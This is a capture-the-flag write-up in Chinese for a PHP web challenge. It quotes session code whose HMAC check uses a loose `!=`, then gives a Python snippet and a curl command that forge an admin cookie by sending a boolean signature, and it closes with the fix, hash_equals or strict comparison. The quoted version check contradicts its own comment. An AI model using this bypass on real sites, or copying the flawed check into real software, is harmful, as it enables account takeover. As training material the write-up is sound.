# PHM #25 Web — login as admin 3

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 70 |

## 題目

> HMAC-signed session, can you forge it?
>
> 連結: [`/login3/`](https://ctf.hackme.quest/login3/)

## 分析

Session 用 HMAC-SHA512 簽名, 但驗證寫錯:

```php
if(!(phpversion() < 8)) {        // 強制跑 PHP 8+
    die('fatal error: wrong php verison');
}

function load_user() {
    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);
    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {  // ← != 不是 !==
        return false;
    }
    $data = json_decode($unserialized['data'], true);
    return ['name' => $data[0], 'admin' => $data[1]];
}
```

`!=` 是 **loose comparison**. 在 PHP 8 下:
- `"abc" != 0` → `true` (type-safe for non-numeric string)
- `"abc" != true` → `(bool)"abc"=true, true!=true` → `false` ← 繞過!

→ 送 `sig: true` (JSON bool). HMAC 回傳的 string 轉 bool 是 true, `true != true` 為 false, 等於**通過驗證**.

## 解法

```python
import json, base64
payload = {'sig': True, 'data': '["guest",1]'}
cookie = base64.b64encode(json.dumps(payload).encode()).decode()
# eyJzaWciOiB0cnVlLCAiZGF0YSI6ICJbXCJndWVzdFwiLDFdIn0=
```

```bash
curl 'https://ctf.hackme.quest/login3/' \
  -H "Cookie: user=eyJzaWciOiB0cnVlLCAiZGF0YSI6ICJbXCJndWVzdFwiLDFdIn0="
# → Hi, guest / You are admin! / FLAG{...}
```

## Flag

```
FLAG{H3110, 4dm1n1576a70r... 1f y0u kn0w my 53cR37 and Use STRONG COMPARE pls}
```

## 感想

PHP 的 `==` / `!=` 一直是重災區. 連 PHP 8 修了 `"abc" == 0` 這類也還留了 **string ↔ bool loose compare**. 唯一安全的寫法是 `hash_equals($a, $b)` (順便避 timing attack) 或至少 `===`.

這題跟 #28 login7 同系: 都靠「loose compare 的意外相等」繞過. #28 用 scientific notation hash, 這題用 bool coercion.
